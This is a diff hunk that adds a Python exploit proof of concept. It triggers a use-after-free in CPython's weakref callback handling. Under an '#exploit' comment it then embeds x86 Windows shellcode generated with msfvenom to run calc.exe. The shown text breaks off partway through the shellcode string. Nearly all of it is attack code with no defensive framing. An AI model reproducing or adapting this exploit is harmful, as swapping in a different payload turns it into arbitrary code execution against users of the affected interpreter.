@@ -1,0 +1,21 @@
+import weakref
+class A(object):pass
+def callback(x):del lst[0]
+keepali0e=[]
+lst=[str()]
+a=A()
+a.c=a
+keepali0e.append(weakref.ref(a,callback))
+del a
+while lst:keepali0e.append(lst[:])
+
+#exploit
+import os
+import time
+import struct
+import subprocess
+#msfvenom -p windows/exec cmd=calc.exe -f c -a x86 --platform windows -b '\x00'
+shellcode=("\xb8\xe5\x35\x1f\x6e\xda\xc3\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
+"\x31\x31\x43\x12\x03\x43\x12\x83\x3f\x61\xc2\x6f\xb1\x43\x7a"
+"\x77\x6e\x1f\xc6\xf6\x8f\x82\x86\xdf\x02\x8b\x0c\x33\x21\x77"
+"\xf3\x36\x90\xdc\x8a\x78\x2c\x3b\x3e\xbe\x49\xfc\x9
